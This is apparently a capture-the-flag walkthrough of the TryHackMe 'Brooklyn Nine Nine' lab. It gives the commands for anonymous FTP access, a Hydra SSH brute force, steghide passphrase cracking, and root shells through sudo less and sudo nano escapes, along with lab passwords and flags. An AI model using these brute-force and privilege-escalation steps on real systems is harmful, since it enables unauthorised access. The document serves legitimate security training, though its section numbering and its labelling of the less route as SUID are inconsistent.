# Brooklyn Nine Nine — Full Walkthrough
### Room Link: https://tryhackme.com/room/brooklynninenine
## 1. Reconnaissance

First, perform a service/version scan:
```bash
nmap -sC -sV -oN nmap.txt <TARGET-IP>
```
The scan reveals:
```bash
21/tcp  open  ftp     vsftpd 3.0.3
22/tcp  open  ssh     OpenSSH 7.6p1 Ubuntu
80/tcp  open  http    Apache httpd 2.4.29
```
The most interesting finding is:

Anonymous FTP login allowed

and an accessible file:

note_to_jake.txt

You can also perform a full TCP port scan:
```bash
nmap -p- --min-rate 5000 -oN allports.txt <TARGET-IP>
```
It confirmed that only these ports were open:
```
21
22
80
```
## 2. Anonymous FTP Enumeration

Connect to FTP anonymously:
```bash
ftp <TARGET-IP>
```
Username: anonymous
```
For the password, you can usually just press Enter.

Then:
```bash
ls
```
You should see:

note_to_jake.txt

Download it:
```bash
get note_to_jake.txt
```
Then:
```bash
bye
```
You will find:

note_to_jake.txt

Read the file:
```bash
cat note_to_jake.txt
```
The note said:
```
From Amy,

Jake please change your password. It is too weak and holt will be mad if someone hacks into the nine nine
```
This gave you an important clue:

Jake has a weak password.

## 3. Finding Jake's Password

Using Hydra against SSH with the rockyou.txt wordlist:
```bash
hydra -l jake -P /usr/share/wordlists/rockyou.txt <TARGET-IP> ssh
```
Hydra successfully discovers:
```
Username: jake
Password: 987654321
```
You could then SSH into the machine:
```bash
ssh jake@<TARGET-IP>
```
## 4. Getting the User Flag

Once logged in as Jake, search for user.txt:
```bash
find / -type f -name "user.txt" 2>/dev/null
```
You found:

/home/holt/user.txt

Read user.txt:
```bash
cat /home/holt/user.txt

User Flag
ee11cbb19052e40b07aac0ca060c23ee
```

Notice that the flag belonged to Holt's home directory, which also hinted that Holt was another user worth investigating.

## 4. First Privilege-Escalation Route — SUID

Check sudo permissions:
```bash
sudo -l
```
The important result is:

User jake may run the following commands on brookly_nine_nine:
```
(ALL) NOPASSWD: /usr/bin/less
```
less is normally just a text viewer, but because it had the SUID permission, it could be abused to execute commands with elevated privileges.

Launching it through sudo:
```bash
sudo less /etc/profile
```
Inside less, use its command execution feature:
```bash
:!/bin/sh
```
This spawns a shell.

Check:
```bash
whoami
```
will return:
```bash
root
```
You will obtain a root shell.

Then you can read:
```bash
cat /root/root.txt

Root Flag
63a9f0ea7bb98050796b649e85481845
```

So you had already completed one intended root route.

## 6. Web Enumeration

You investigated port 80:
```bash
curl -s http://<TARGET-IP>
```
The webpage contains an image:

brooklyn99.jpg

More importantly, the HTML contains this comment:

<!-- Have you ever heard of steganography? -->

This is a strong indication that the image contains hidden information.

## 7. Investigating the Steganography Route

Download the image:
```bash
wget http://<TARGET-IP>/brooklyn99.jpg
```
You can first try:
```bash
steghide extract -sf brooklyn99.jpg
```
It will ask for a passphrase.

You can then use:
```bash
stegcracker brooklyn99.jpg /usr/share/wordlists/rockyou.txt
```
StegCracker successfully cracked the embedded steghide data and found:

admin

So the steghide passphrase is:
```bash
admin
```
You can then perform the extraction:
```bash
steghide extract -sf brooklyn99.jpg
```
This time it will produce:
```
wrote extracted data to "note.txt".
```
## 8. Extracting Holt's Password

Read the extracted file:
```bash
cat note.txt
```
It contains:
```
Holts Password:
fluffydog12@ninenine

Enjoy!!
```
Therefore you discovered Holt's password

Switch to Holt:
```bash
su holt
```
and authenticate using the password:
```bash
fluffydog12@ninenine
```

## 9. Second Privilege-Escalation Route — Sudo Nano

As Holt, check sudo permissions:
```bash
sudo -l
```
The important result is:

User holt may run the following commands on brookly_nine_nine:
```
(ALL) NOPASSWD: /bin/nano
```
This means Holt could execute nano as root without entering a password.

Launch:
```bash
sudo nano
```
Inside Nano, use its command-execution functionality to execute:
```bash
reset; sh 1>&0 2>&0
```
This will give you a shell with root privileges.

You can verify it:
```bash
whoami
```
Output:
```
root
```
Then:
```bash
cat /root/root.txt
```
returned:
```
-- Creator : Fsociety2006 --
Congratulations in rooting Brooklyn Nine Nine
Here is the flag: 63a9f0ea7bb98050796b649e85481845

Enjoy!!
```
## 10. Final Attack Chain

You effectively discovered both intended routes.

Route 1 — Jake / SUID
Nmap
  ↓
FTP anonymous access
  ↓
note_to_jake.txt
  ↓
Jake has weak password
  ↓
Hydra
  ↓
jake : 987654321
  ↓
SSH
  ↓
SUID enumeration
  ↓
/bin/less
  ↓
sudo less /etc/profile
  ↓
:!/bin/sh
  ↓
ROOT
Route 2 — Holt / Steganography / Nano
Nmap
  ↓
HTTP
  ↓
brooklyn99.jpg
  ↓
"Have you ever heard of steganography?"
  ↓
Steghide
  ↓
StegCracker
  ↓
Passphrase: admin
  ↓
note.txt
  ↓
Holt password: fluffydog12@ninenine
  ↓
su holt
  ↓
sudo -l
  ↓
NOPASSWD: /bin/nano
  ↓
sudo nano
  ↓
Command execution
  ↓
ROOT

Flags
Flag	Value
User flag	ee11cbb19052e40b07aac0ca060c23ee
Root flag	63a9f0ea7bb98050796b649e85481845